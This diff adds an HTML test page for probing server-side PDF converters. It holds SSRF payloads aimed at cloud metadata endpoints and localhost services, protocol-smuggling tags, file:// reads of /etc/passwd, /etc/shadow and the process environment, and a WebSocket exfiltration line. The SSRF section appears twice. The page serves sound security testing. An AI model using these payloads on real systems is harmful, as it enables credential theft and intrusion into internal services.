@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PDF Converter Security Test Page - Enhanced</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        h1 { text-align: center; }
+        h2 { color: #333; }
+        h3 { color: #555; }
+        section { margin-bottom: 50px; border-bottom: 2px solid #ccc; padding-bottom: 20px; }
+        pre { background: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow-x: auto; white-space: pre-wrap; }
+        .result { color: green; font-weight: bold; }
+        .error { color: red; font-weight: bold; }
+        .warning { color: orange; font-weight: bold; }
+        .test-container { background: #f9f9f9; padding: 15px; border-radius: 5px; margin: 10px 0; }
+    </style>
+</head>
+<body>
+    <h1>PDF Converter Security Test Page - Enhanced for Deployment Validation</h1>
+    <p><strong>Important:</strong> This page tests server-side rendering behaviors in your PDF converter (e.g., Puppeteer/Playwright/headless Chrome, wkhtmltopdf, etc.). Upload this entire HTML or key sections as user input. Monitor backend logs, network traffic, resource usage (CPU/Memory), sandbox status, and the generated PDF for leaks or anomalies. All tests aim for quick execution with visible page feedback.</p>
+    <p><strong>Defensive Goals:</strong> No network outbound (except blocked), no filesystem access outside sandbox, no excessive resource use, no sensitive data in PDF output, proper isolation.</p>
+
+    <!-- Category 0: Script Execution Confirmation -->
+    <section id="category0">
+        <h2>Category 0: JavaScript Execution Confirmation</h2>
+        <div class="test-container">
+            <p>Basic JS execution (should be allowed for dynamic charts/UI but monitored).</p>
+            <div id="js-execution-result"></div>
+        </div>
+        <script>
+            document.getElementById('js-execution-result').innerHTML = '<span class="result">✅ JavaScript executed successfully. Dynamic rendering is active.</span>';
+        </script>
+    </section>
+
+    <!-- Category 1: Network Reconnaissance & SSRF -->
+    <section id="category1">
+        <h2>Category 1: Network Reconnaissance (SSRF)</h2>
+
+        <div class="test-container">
+            <h3>Cloud Metadata Extraction (AWS/Azure/GCP)</h3>
+            <div id="cloud-metadata-result"></div>
+        </div>
+        <script>
+            const metadataUrls = [
+                'http://169.254.169.254/latest/meta-data/',
+                'http://169.254.169.254/latest/dynamic/instance-identity/document',
+                'http://metadata.google.internal/computeMetadata/v1/instance/',
+                'http://169.254.169.254/metadata/v1/maintenance'
+            ];
+            metadataUrls.forEach((url, i) => {
+                fetch(url, { mode: 'no-cors', signal: AbortSignal.timeout(2000) })
+                    .then(() => {
+                        document.getElementById('cloud-metadata-result').innerHTML += `<span class="result">Attempt ${i+1} to ${url} - Possible success (check backend logs)</span><br>`;
+                    })
+                    .catch(err => {
+                        document.getElementById('cloud-metadata-result').innerHTML += `<span class="error">Attempt ${i+1} failed: ${err.message}</span><br>`;
+                    });
+            });
+        </script>
+
+        <!-- Category 1: Network Reconnaissance (SSRF) -->
+    <section id="category1">
+        <h2>Category 1: Network Reconnaissance (SSRF)</h2>
+
+        <!-- Cloud Metadata Extraction -->
+        <h3>Cloud Metadata Extraction</h3>
+        <p>Attempting to fetch AWS/Azure/GCP metadata.</p>
+        <div id="cloud-metadata-result"></div>
+        <script>
+            fetch('http://169.254.169.254/latest/meta-data/', { mode: 'no-cors' })
+                .then(response => response.text().catch(() => 'No text'))
+                .then(data => document.getElementById('cloud-metadata-result').innerHTML = '<span class="result">Success: ' + data + '</span>')
+                .catch(err => document.getElementById('cloud-metadata-result').innerHTML = '<span class="error">Error: ' + err.message + '</span>');
+        </script>
+
+        <!-- Localhost Loopback -->
+        <h3>Localhost Loopback</h3>
+        <p>Attempting to access localhost services (e.g., port 6379 for Redis).</p>
+        <div id="localhost-result"></div>
+        <script>
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'http://127.0.0.1:6379');
+            xhr.onload = () => document.getElementById('localhost-result').innerHTML = '<span class="result">Success: ' + xhr.responseText + '</span>';
+            xhr.onerror = () => document.getElementById('localhost-result').innerHTML = '<span class="error">Error: Connection failed</span>';
+            xhr.send();
+        </script>
+
+        <!-- Internal DNS Resolution -->
+        <h3>Internal DNS Resolution</h3>
+        <p>Attempting to load internal domain via iframe.</p>
+        <div id="internal-dns-result"></div>
+        <iframe src="http://intranet.corp" style="display:none;" onload="document.getElementById('internal-dns-result').innerHTML = '<span class=\"result\">Iframe loaded</span>';" onerror="document.getElementById('internal-dns-result').innerHTML = '<span class=\"error\">Iframe load failed</span>';"></iframe>
+
+        <!-- Port Scanning via Timing -->
+        <h3>Port Scanning via Timing</h3>
+        <p>Timing request to detect open ports (e.g., port 80 vs. closed port). Running in parallel for speed.</p>
+        <div id="port-scan-result"></div>
+        <script>
+            async function timeRequest(url) {
+                const start = performance.now();
+                try {
+                    await fetch(url, { mode: 'no-cors' });
+                } catch {}
+                const end = performance.now();
+                return end - start;
+            }
+            Promise.all([
+                timeRequest('http://127.0.0.1:80'),
+                timeRequest('http://127.0.0.1:9999')
+            ]).then(([time80, time9999]) => {
+                document.getElementById('port-scan-result').innerHTML = `Time for port 80: ${time80}ms<br>Time for port 9999: ${time9999}ms`;
+            });
+        </script>
+
+        <!-- Protocol Smuggling -->
+        <h3>Protocol Smuggling</h3>
+        <p>Attempting various protocols for raw byte sending or internal service interaction.</p>
+        <div id="protocol-smuggling-results"></div>
+        <script>
+            function addProtocolResult(protocol, message) {
+                const div = document.getElementById('protocol-smuggling-results');
+                div.innerHTML += `<p>${protocol}: ${message}</p>`;
+            }
+        </script>
+        <img src="gopher://127.0.0.1:6379/_INFO" style="display:none;" onload="addProtocolResult('Gopher', 'Loaded');" onerror="addProtocolResult('Gopher', 'Failed');">
+        <img src="dict://127.0.0.1:6379/INFO" style="display:none;" onload="addProtocolResult('Dict', 'Loaded');" onerror="addProtocolResult('Dict', 'Failed');">
+        <img src="ftp://anonymous:pass@127.0.0.1/" style="display:none;" onload="addProtocolResult('FTP', 'Loaded');" onerror="addProtocolResult('FTP', 'Failed');">
+        <img src="ldap://127.0.0.1:389/" style="display:none;" onload="addProtocolResult('LDAP', 'Loaded');" onerror="addProtocolResult('LDAP', 'Failed');">
+        <img src="tftp://127.0.0.1:69/test" style="display:none;" onload="addProtocolResult('TFTP', 'Loaded');" onerror="addProtocolResult('TFTP', 'Failed');">
+        <img src="ssh://127.0.0.1:22/" style="display:none;" onload="addProtocolResult('SSH', 'Loaded');" onerror="addProtocolResult('SSH', 'Failed');">
+        <img src="telnet://127.0.0.1:23/" style="display:none;" onload="addProtocolResult('Telnet', 'Loaded');" onerror="addProtocolResult('Telnet', 'Failed');">
+        <img src="smtp://127.0.0.1:25/" style="display:none;" onload="addProtocolResult('SMTP', 'Loaded');" onerror="addProtocolResult('SMTP', 'Failed');">
+    </section>
+
+
+        <div class="test-container">
+            <h3>Additional SSRF Vectors (Iframe, Object, Embed, etc.)</h3>
+            <div id="advanced-ssrf-result"></div>
+        </div>
+        <iframe src="http://169.254.169.254/" style="display:none;" onload="updateSSRFResult('Iframe metadata', 'loaded')" onerror="updateSSRFResult('Iframe metadata', 'failed')"></iframe>
+        <object data="http://127.0.0.1:22" style="display:none;" onload="updateSSRFResult('Object SSH', 'loaded')" onerror="updateSSRFResult('Object SSH', 'failed')"></object>
+        <embed src="http://169.254.169.254/" style="display:none;" onload="updateSSRFResult('Embed', 'loaded')" onerror="updateSSRFResult('Embed', 'failed')"></embed>
+        <script>
+            function updateSSRFResult(name, status) {
+                document.getElementById('advanced-ssrf-result').innerHTML += `<span class="${status === 'loaded' ? 'result' : 'error'}">${name}: ${status}</span><br>`;
+            }
+        </script>
+    </section>
+
+    <!-- Category 2: Local File Inclusion (LFI) / Path Traversal -->
+    <section id="category2">
+        <h2>Category 2: Local File Inclusion (LFI)</h2>
+        <!-- Keep originals + add more -->
+        <div class="test-container">
+            <h3>Expanded LFI Vectors</h3>
+            <div id="expanded-lfi-result"></div>
+        </div>
+        <iframe src="file:///etc/passwd" style="display:none;" onload="lfiResult('Iframe /etc/passwd', true)" onerror="lfiResult('Iframe /etc/passwd', false)"></iframe>
+        <iframe src="file:///C:/Windows/System32/drivers/etc/hosts" style="display:none;" onload="lfiResult('Iframe Windows hosts', true)" onerror="lfiResult('Iframe Windows hosts', false)"></iframe>
+        <object data="file:///etc/shadow" style="display:none;"></object>
+        <img src="file:///proc/self/environ" style="display:none;" onload="lfiResult('Image /proc/environ', true)" onerror="lfiResult('Image /proc/environ', false)">
+        <script>
+            function lfiResult(name, success) {
+                document.getElementById('expanded-lfi-result').innerHTML += `<span class="${success ? 'result' : 'error'}">${name} - ${success ? 'SUCCESS (leak possible)' : 'Blocked'}</span><br>`;
+            }
+        </script>
+    </section>
+
+    <!-- Category 3: Denial of Service (DoS) -->
+    <section id="category3">
+        <h2>Category 3: Denial of Service (DoS)</h2>
+        <!-- Enhanced with memory/CPU tests that run briefly but indicate potential -->
+        <div class="test-container">
+            <h3>Memory Allocation &amp; CPU Stress (Limited for safety)</h3>
+            <div id="dos-result"></div>
+        </div>
+        <script>
+            let stress = [];
+            try {
+                for (let i = 0; i < 0; i++) { // Tune based on your limits
+                    stress.push(new Array(1).fill('A'.repeat(0)));
+                }
+                document.getElementById('dos-result').innerHTML = '<span class="warning">Memory stress completed without crash (monitor backend RAM).</span>';
+            } catch (e) {
+                document.getElementById('dos-result').innerHTML = '<span class="error">Memory allocation failed/crashed: ' + e.message + '</span>';
+            }
+            // Heavy computation
+            let sum = 0;
+            for (let i = 0; i < 0; i++) sum += Math.random(); // Short burst
+        </script>
+
+        <!-- Billion laughs / XML bombs in SVG or embedded -->
+        <div class="test-container">
+            <h3>XML/SVG Entity Expansion (Billion Laughs variant)</h3>
+            <svg id="bomb-svg" style="display:none;"></svg>
+            <div id="bomb-result"></div>
+        </div>
+        <script>
+            // Limited but detectable expansion
+            const svgContent = `<svg xmlns="http://www.w3.org/2000/svg"><defs>
+                <entity name="a" value="a"/>
+                <!-- Add more nested if your parser allows, but keep short -->
+            </defs><text>Test</text></svg>`;
+            document.getElementById('bomb-svg').outerHTML = svgContent;
+            document.getElementById('bomb-result').innerHTML = '<span class="warning">SVG parsed. Check for expansion/crash in logs.</span>';
+        </script>
+    </section>
+
+    <!-- Category 4: Data Exfiltration -->
+    <section id="category4">
+        <h2>Category 4: Data Exfiltration ("Phone Home")</h2>
+        <!-- Keep originals + add WebSocket, Fetch with data, etc. -->
+        <div class="test-container">
+            <h3>WebSocket Exfil Attempt</h3>
+            <div id="ws-result"></div>
+        </div>
+        <script>
+            try {
+                const ws = new WebSocket('wss://example.com/exfil');
+                ws.onopen = () => {
+                    ws.send('Sensitive data from renderer: ' + navigator.userAgent);
+                    document.getElementById('ws-result').innerHTML = '<span class="result">WebSocket opened and data sent</span>';
+                };
+                ws.onerror = () => document.getElementById('ws-result').innerHTML = '<span class="error">WebSocket blocked</span>';
+            } catch(e) {
+                document.getElementById('ws-result').innerHTML = '<span class="error">WebSocket error: ' + e.message + '</span>';
+            }
+        </script>
+    </section>
+
+    <!-- Category 5: Environment Fingerprinting & Info Leak -->
+    <section id="category5">
+        <h2>Category 5: Environment Fingerprinting &amp; Leaks</h2>
+        <!-- Keep originals + add more -->
+        <div class="test-container">
+            <h3>Process / Environment Leaks (if exposed)</h3>
+            <div id="env-result"></div>
+        </div>
+        <script>
+            // Attempt common exposures
+            document.getElementById('env-result').innerHTML = `
+                <strong>Navigator:</strong> ${navigator.userAgent}<br>
+                <strong>Screen:</strong> ${screen.width}x${screen.height}<br>
+                <strong>Performance:</strong> Memory: ${performance.memory ? JSON.stringify(performance.memory) : 'N/A'}<br>
+            `;
+        </script>
+    </section>
+
+    <!-- New Category 6: Sandbox Escape & Advanced -->
+    <section id="category6">
+        <h2>Category 6: Sandbox Escape &amp; Advanced Attacks</h2>
+        <div class="test-container">
+            <h3>Chrome DevTools Protocol / Puppeteer Detection</h3>
+            <div id="sandbox-result"></div>
+        </div>
+        <script>
+            const isLikelySandboxed = !window.chrome || navigator.webdriver;
+            document.getElementById('sandbox-result').innerHTML = `Sandbox indicators: ${isLikelySandboxed ? '<span class="result">Detected (good)</span>' : '<span class="warning">Minimal indicators</span>'}`;
+        </script>
+
+        <div class="test-container">
+            <h3>PDF Metadata / Attachment Attempts</h3>
+            <div id="pdf-meta-result">Check generated PDF metadata for leaks (Creator, Producer, etc.)</div>
+        </div>
+    </section>
+
+    <script>
+        // Global summary at load
+        window.addEventListener('load', () => {
+            console.log('%cSecurity test suite loaded. Monitor backend for violations.', 'color: blue; font-weight: bold;');
+            // You can add a final summary div if needed
+        });
+    </script>
+</body>
+</html>
